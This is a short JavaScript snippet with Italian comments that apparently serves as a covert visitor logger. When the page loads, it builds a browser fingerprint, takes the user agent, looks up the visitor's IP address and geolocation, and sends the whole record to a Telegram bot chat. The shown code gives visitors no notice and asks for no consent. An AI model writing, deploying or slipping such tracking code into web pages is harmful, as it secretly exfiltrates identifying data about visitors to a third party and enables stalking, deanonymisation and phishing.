var userData = {
    IP: {},
    fingerprintHash: '',
    userAgent: navigator.userAgent
};

// Calcolo fingerprint con sintassi aggiornata
Fingerprint2.get(function(components) {
    const values = components.map(c => c.value);
    userData.fingerprintHash = Fingerprint2.x64hash128(values.join(''), 31);
});

// Funzione per invio a Telegram
var sendIpsTelegram = function() {                                      
    var endpoint = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';

    // Recupero info IP
    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {         
        userData.IP = dataIP;

        // Dopo che ho i dati mando tutto a Telegram
        var xhr = new XMLHttpRequest();
        xhr.open("POST", endpoint, true);
        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');

        var data = {
            chat_id: CHAT_ID,              
            text: JSON.stringify(userData, null, 2)
        };

        xhr.send(JSON.stringify(data));
    });
}

// Avvia invio
sendIpsTelegram();
